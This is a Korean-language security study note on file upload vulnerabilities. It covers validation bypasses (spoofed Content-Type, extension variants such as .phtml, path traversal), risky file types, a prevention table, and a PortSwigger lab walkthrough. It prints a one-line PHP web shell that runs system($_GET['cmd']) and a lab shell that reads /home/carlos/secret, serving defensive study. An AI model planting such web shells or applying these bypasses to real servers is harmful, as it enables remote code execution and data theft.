# File Upload Vulnerabilities

## 개념

파일 업로드 기능에서 서버가 업로드된 파일의 타입/내용을 제대로 검증하지 않을 때 발생.
공격자가 악성 파일(웹쉘 등)을 업로드해서 서버에서 임의의 코드를 실행할 수 있음.

OWASP Top 10 2021 기준 **A08 — Software and Data Integrity Failures** 와 연관.

---

## 공격 시나리오

```
1. 공격자가 webshell.php 업로드
2. 서버가 /uploads/webshell.php 에 파일 저장
3. 공격자가 http://victim.com/uploads/webshell.php?cmd=whoami 요청
4. 서버에서 PHP 코드가 실행됨 → 서버 장악
```

### 웹쉘 예시 (PHP)
```php
<?php echo system($_GET['cmd']); ?>
```
이 한 줄짜리 파일이 업로드되면 URL 파라미터로 서버 명령어를 실행할 수 있음.

---

## 취약한 검증 방식과 우회법

### 1) Content-Type 헤더만 검사
```
서버: Content-Type이 image/jpeg 이면 허용
공격: Burp Suite로 Content-Type 헤더를 image/jpeg 로 조작
→ 실제 내용은 PHP 코드여도 통과
```

### 2) 파일 확장자 블랙리스트
```
서버: .php 확장자 차단
공격: .php5, .phtml, .pHp, .Php 등 변형 사용
→ 서버 설정에 따라 이런 확장자도 PHP로 실행될 수 있음
```

### 3) 파일 확장자 화이트리스트 + 내용 무검사
```
서버: .jpg, .png 만 허용
공격: 파일명을 webshell.jpg 로 하고 내용은 PHP 코드 삽입
→ 파일 내용(MIME type)을 별도로 검사하지 않으면 통과
```

### 4) 경로 조작 (Path Traversal)
```
파일명에 ../../ 삽입
→ 업로드 디렉토리를 벗어나 원하는 위치에 저장
```

---

## 취약점이 없어도 위험한 경우

| 상황 | 위험 |
|------|------|
| SVG 파일 허용 | SVG 안에 JavaScript 삽입 → Stored XSS |
| HTML 파일 허용 | HTML 안에 스크립트 삽입 → XSS |
| XML 파일 허용 | XXE(XML External Entity) 공격 가능 |
| 압축 파일 허용 | Zip Bomb으로 서버 자원 소진 |

---

## 예방법

| 항목 | 조치 |
|------|------|
| 파일명 | 업로드된 파일명 그대로 저장 금지 → 랜덤 UUID로 변경 |
| 확장자 | 화이트리스트 방식 (허용 목록만 통과) |
| 파일 내용 | MIME type 실제 내용 검사 (magic bytes 확인) |
| 저장 위치 | 웹 루트 밖에 저장 or 실행 권한 없는 디렉토리 |
| 이미지 | 업로드 후 이미지 라이브러리로 재가공 (메타데이터 제거) |
| CDN | 파일 서빙은 별도 도메인에서 (same-origin 격리) |

---

## PortSwigger Lab — Remote code execution via web shell upload

**링크**: `portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload`

### 목표
PHP 웹쉘을 업로드해서 서버의 `/home/carlos/secret` 파일 내용 읽기

### 풀이 흐름
1. 프로필 이미지 업로드 기능 발견
2. 아래 내용으로 `webshell.php` 파일 생성:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
3. 이미지 업로드 폼에서 `webshell.php` 업로드
4. 업로드된 파일 경로로 직접 GET 요청
   ```
   GET /files/avatars/webshell.php
   ```
5. 응답에서 secret 값 획득

### 핵심 포인트
- 서버가 파일 타입을 전혀 검증하지 않는 가장 기본적인 케이스
- 업로드 디렉토리에서 PHP 실행이 허용되어 있는 상황
